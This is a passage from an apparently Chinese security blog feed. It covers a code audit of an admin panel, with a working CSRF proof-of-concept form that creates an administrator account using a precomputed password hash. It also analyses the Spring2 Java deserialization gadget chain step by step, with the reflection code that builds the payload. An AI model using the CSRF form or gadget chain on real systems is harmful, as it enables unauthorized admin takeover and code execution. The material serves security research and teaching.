class="hljs-title function_">getCountByName</span><span class="hljs-params">(String name)</span> &#123;<br><span class="hljs-keyword">return</span> sqlHelper.findCountByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(Admin::getName, name), Admin.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到进行sql查询，查看数据库是否存在用户。不存在此用户就在service层面创建用户，跟进adminService.addOver。</p><p>com&#x2F;cym&#x2F;service&#x2F;AdminService.java#addOver()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addOver</span><span class="hljs-params">(Admin admin, String[] groupIds)</span> &#123;<br>sqlHelper.insertOrUpdate(admin);<br><br>sqlHelper.deleteByQuery(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionAndWrapper</span>().eq(AdminGroup::getAdminId, admin.getId()), AdminGroup.class);<br><span class="hljs-keyword">if</span> (admin.getType() == <span class="hljs-number">1</span> &amp;&amp; groupIds != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">for</span> (String id : groupIds) &#123;<br><span class="hljs-type">AdminGroup</span> <span class="hljs-variable">adminGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdminGroup</span>();<br>adminGroup.setAdminId(admin.getId());<br>adminGroup.setGroupId(id);<br>sqlHelper.insert(adminGroup);<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法直接将admin添加到数据库，deleteByQuery就是根据admin_id删除admin_group的数据，不重要，dmin.getType() &#x3D;&#x3D; 1就是非管理员，管理员的type为0，不会走到这里。</p><p>com&#x2F;cym&#x2F;utils&#x2F;EncodePassUtils.java#encode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encode</span><span class="hljs-params">(String pass)</span> &#123;<br><br><span class="hljs-keyword">if</span> (StrUtil.isNotEmpty(pass)) &#123;<br>pass = SecureUtil.md5(pass) + SecureUtil.md5(defaultPass);<br>&#125;<br><br><span class="hljs-keyword">return</span> pass;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">encodeDefaultPass</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> SecureUtil.md5(defaultPass) + SecureUtil.md5(defaultPass);<br>&#125;<br></code></pre></td></tr></table></figure><p>这是pass生成算法。直接调用生成pass添加到Admin。</p><p>由于Admin类型我们可控，所以构建Admin类型的时候，我们传入id，name，pass，type，api即可，然后在写入数据库直接写入账号密码（默认不创建密码，且后续根据id修改密码，id不可控，是一个随机数），所以这里创建好Admin类型，进行csrf即可。</p><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p><img src="image-20231123035053907.png" alt="image-20231123035053907"></p><p>调用算法生成123456对应pass</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">e<span class="hljs-number">10</span>adc<span class="hljs-number">3949</span>ba<span class="hljs-number">59</span>abbe<span class="hljs-number">56e057</span>f<span class="hljs-number">20</span>f<span class="hljs-number">883</span>ec<span class="hljs-number">7231</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>ecd<span class="hljs-number">7</span>fa<span class="hljs-number">89</span>fd<span class="hljs-number">6</span>bae<span class="hljs-number">6e81</span>d<span class="hljs-number">2</span>adc<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>构造csrf数据包</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://10.0.0.67:8080/adminPage/admin/addOver&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;test&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;api&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;type&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;0&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;parentId&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;pass&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883ec7231c2ecd7fa89fd6bae6e81d2adc80&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>action改为对应的网址，name改为要创建的用户。</p><p>模拟admin用户在线，引导admin用户点击链接</p><p><img src="image-20231123035726533.png" alt="image-20231123035726533"></p><p>点击后成功创建用户</p><p><img src="image-20231123035814882.png" alt="image-20231123035814882"></p><p>成功登陆</p><p><img src="image-20231123040124874.png" alt="image-20231123040124874"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>没办法，鉴权做的太好了，只能通过社工来进入后台，后台有命令执行功能点，没什么好审计rce的点，水几个垃圾洞好了。</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spring2-gadget</title>
    <link href="/2023/12/14/spring2-gadget/"/>
    <url>/2023/12/14/spring2-gadget/</url>
    
    <content type="html"><![CDATA[<ol><li>依赖版本</li></ol><p>spring-core : 4.1.4.RELEASE<br>spring-aop : 4.1.4.RELEASE<br>jdk 1.7-1.8</p><p>Spring2 在 Spring1 的触发链上有所变换，替换了 spring-beans 的 ObjectFactoryDelegatingInvocationHandler，使用了 spring-aop 的 JdkDynamicAopProxy ，并完成了后续触发 TemplatesImpl 的流程。</p><h2 id="0x01-MethodInvokeTypeProvider"><a href="#0x01-MethodInvokeTypeProvider" class="headerlink" title="0x01 MethodInvokeTypeProvider"></a>0x01 MethodInvokeTypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider.java</p><p>接下来我们从反序列触发点开始分析。</p><p>readObject()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>inputStream.defaultReadObject();<br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> ReflectionUtils.findMethod(<span class="hljs-built_in">this</span>.provider.getType().getClass(), <span class="hljs-built_in">this</span>.methodName);<br><span class="hljs-built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="hljs-built_in">this</span>.provider.getType());<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="1700938325145-d7d5aee2-c3cf-4343-b7db-dfa471b73006-20231214002318574.png" alt="img"></p><p>先在class找对应的方法，然后使用这个方法。调用的方法只能是无参方法。很容易就想到TemplatesImpl.newTransformer()。也就是办法把methodName改为newTransformer，provider.getType().getClass()要得到TemplatesI。</p><h2 id="0x02-AnnotationInvocationHandler-java"><a href="#0x02-AnnotationInvocationHandler-java" class="headerlink" title="0x02 AnnotationInvocationHandler.java"></a>0x02 AnnotationInvocationHandler.java</h2><p>sun&#x2F;reflect&#x2F;annotation&#x2F;AnnotationInvocationHandler.java</p><p>通过这个AnnotationInvocationHandler.java 动态代理结合interfaces，然后在反射构造函数传入map，map里面包含interfaces里面的方法名，和一个对象(<strong>map(“方法名”，Object)</strong>)，就可以在invocationHandler.invoke()调用时放回这个<strong>Object，</strong>这就是Spring1这条链的精髓所在<strong>。</strong></p><p><img src="1700937893410-8dbc5a8b-7b81-488e-a7fa-7c4c45914c1e-20231214002318581.png" alt="img"></p><p><img src="1700937914135-815c9d15-7551-4c86-afac-96e1bc946ce9-20231214002318564.png" alt="img"></p><p><img src="1700937934220-d58a68a8-ae74-468a-9559-d6af8b456278-20231214002318579.png" alt="img"></p><p>invoke</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">member</span> <span class="hljs-operator">=</span> method.getName();<br>       Class&lt;?&gt;[] paramTypes = method.getParameterTypes();<br><br>       <span class="hljs-comment">// Handle Object and Annotation methods</span><br>       <span class="hljs-keyword">if</span> (member.equals(<span class="hljs-string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="hljs-number">1</span> &amp;&amp;<br>           paramTypes[<span class="hljs-number">0</span>] == Object.class)<br>           <span class="hljs-keyword">return</span> equalsImpl(args[<span class="hljs-number">0</span>]);<br>       <span class="hljs-keyword">if</span> (paramTypes.length != <span class="hljs-number">0</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AssertionError</span>(<span class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>       <span class="hljs-keyword">switch</span>(member) &#123;<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>           <span class="hljs-keyword">return</span> toStringImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>           <span class="hljs-keyword">return</span> hashCodeImpl();<br>       <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>           <span class="hljs-keyword">return</span> type;<br>       &#125;<br><br>       <span class="hljs-comment">// Handle annotation member accessors</span><br>       <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br><br>       <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br><br>       <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>           <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>       <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>           result = cloneArray(result);<br><br>       <span class="hljs-keyword">return</span> result;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-TypeProvider"><a href="#0x03-TypeProvider" class="headerlink" title="0x03 TypeProvider"></a>0x03 TypeProvider</h2><p>org.springframework.core.SerializableTypeWrapper$TypeProvider</p><p><img src="1700938736196-62c5cd98-c206-43cb-9c64-00bb1622fd67-20231214002318577.png" alt="img"></p><p>TypeProvider这个接口刚好有这个方法，可以想到通过AnnotationInvocationHandler.invoke来放回TemplatesI。</p><p>那么就是通过动态代理代理TypeProvider接口，invocationHandler传入AnnotationInvocationHandler，然后通过反射调用构造函数传入map(“geType”，TemplatesI)，在调用接口任意方法就能返回TemplatesI。</p><p>对应的实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br><br><span class="hljs-comment">// 接下来代理  TypeProvider 的 getType() 方法，使其返回我们创建的 typeTemplateProxy 代理类</span><br>HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map2.put(<span class="hljs-string">&quot;getType&quot;</span>, templates);<br><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><span class="hljs-comment">// 初始化 MethodInvokeTypeProvider</span><br>Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>cons.setAccessible(<span class="hljs-literal">true</span>);<br>cons.newInstance(typeProviderProxy,Templates.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>调试</p><p><img src="1700940037452-042b5e6e-7cd4-45dd-b0bc-320413010234-20231214002318610.png" alt="img"></p><p>可以发现成功返回了TemplatesImpl。</p><p>但是为什么没有加载成功defindclass了。</p><p><img src="1700940133796-e76ec26b-1260-4974-9989-eb495f1ccc93-20231214002318593.png" alt="img"></p><p><strong>这里报错需要一个Type，但是TemplatesImpl cannot be cast to java.lang.reflect.Type，我们需要返回type对象，然后这个继续通过动态代理type对象然后返回TemplatesImpl对象。 这样需要一个InvocationHandler接口的实现类，它的invoke需要满足返回需要去触发另一个动态代理去返回TemplatesImpl对象，然后它需要继承Serializable，最好是jdk原生类，或者Spring里面的类。前辈找到了JdkDynamicAopProxy可以满足这个要求。</strong></p><h2 id="0x04-JdkDynamicAopProxy，AdvisedSupport"><a href="#0x04-JdkDynamicAopProxy，AdvisedSupport" class="headerlink" title="0x04 JdkDynamicAopProxy，AdvisedSupport"></a>0x04 JdkDynamicAopProxy，AdvisedSupport</h2><p><strong>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;AdvisedSupport.java</strong></p><p><img src="1701793454923-2ba3c595-5dc3-4fc5-a779-bd46206ed72f.png" alt="img"></p><p>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;AdvisedSupport.java#setTarget（）</p><p><img src="1701793507324-0e71e207-3f9b-4e7e-9e30-79c75a34baa0.png" alt="img"></p><p>也就是通过setTarget对EMPTY_TARGET_SOURCE赋值，从而对targetSource赋值，</p><p><strong>org&#x2F;springframework&#x2F;aop&#x2F;framework&#x2F;JdkDynamicAopProxy.java#invoke()</strong></p><p><img src="1701793156483-92278a73-dacb-4767-a7e5-429b61b83be9.png" alt="img"></p><p>获取 AdvisedSupport 里的 TargetSource，并调用 getTarget() 方法返回其中的对象</p><p><img src="1701793221615-9a34765e-5e44-4207-bbbe-f0acf846a5d5.png" alt="img"></p><p><img src="1701793246108-24036ed5-15ba-487b-a9b7-f6fd50e12827.png" alt="img">调用 AopUtils#invokeJoinpointUsingReflection() 方法反射调用对象的 method 方法并返回。</p><p>方法里就是简单的反射调用。</p><p><img src="1701793361423-7f344a50-8377-43fb-9b20-e9446532f1e7.png" alt="img"></p><p>在看JdkDynamicAopProxy构造函数。</p><p><img src="1701793751706-5ffc8718-c809-4a5e-865c-87b0d632643a.png" alt="img"></p><p>一切都很巧妙。</p><p><strong>总结起来就是先初始化AdvisedSupport，然后把template对象setTarget进去，然后JdkDynamicAopProxy构造函数赋值advised为AdvisedSupport。这样动态代理JdkDynamicAopProxy时，就能触发targetSource.getTarget()，得到template对象。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java">      Class&lt;?&gt; Annotation = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>      Constructor&lt;?&gt; annotationDeclaredConstructor = Annotation.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      annotationDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br><br>      <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>      advisedSupport.setTarget(templates);<br>      Class&lt;?&gt; Aop = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>      Constructor&lt;?&gt; AopConstructor = Aop.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      AopConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>      <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)AopConstructor.newInstance(advisedSupport);<br>      <span class="hljs-comment">// 我们用它代理一个既是 Type 类型又是 Templates(TemplatesImpl 父类) 类型的类</span><br>      <span class="hljs-comment">// 这样这个代理类同时拥有两个类的方法，既能被强转为 TypeProvider.getType() 的返回值，又可以在其中找到 newTransformer 方法        </span><br><span class="hljs-type">Type</span> <span class="hljs-variable">Aopproxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class,<br>              Templates.class&#125;, AopInvocationHandler);<br><br>      HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>      hashMap.put(<span class="hljs-string">&quot;getType&quot;</span>,Aopproxy);<br>      <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">AnnotationInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationDeclaredConstructor.newInstance(Target.class, hashMap);<br><br>      Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>      <span class="hljs-comment">// 使用 AnnotationInvocationHandler 动态代理 TypeProvider 的 getType 方法，使其返回 typeTemplateProxy</span><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>              <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, AnnotationInvocationHandler);<br><br>      Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>      Constructor&lt;?&gt; MethodIConstructor = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>      MethodIConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>      <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Templates.class.getMethod(<span class="hljs-string">&quot;newTransformer&quot;</span>),<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p><img src="1701795213210-9ace4276-f84e-42c5-8c80-a4912c68cbad.png" alt="img"></p><p>运行没有问题。</p><p>由于需要反序列化触发。</p><p>所以MethodInvokeTypeProvider初始化时Method随便传一个，然后通过反射修改回newTransfrom。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> MethodIConstructor.newInstance(typeProviderProxy,Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>),<span class="hljs-number">0</span>);<br>setFieldValue(objects,<span class="hljs-string">&quot;methodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="0x05-完整利用链"><a href="#0x05-完整利用链" class="headerlink" title="0x05 完整利用链"></a>0x05 完整利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()<br>    SerializableTypeWrapper.TypeProvider(Proxy).getType()<br>    AnnotationInvocationHandler.invoke()<br>    ReflectionUtils.invokeMethod()<br>    Templates(Proxy).newTransformer()<br>    JdkDynamicAopProxy.invoke()<br>                        AopUtils.invokeJoinpointUsingReflection()<br>    TemplatesImpl.newTransformer()<br></code></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tmp.cc;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AopProxy;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">spring2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> 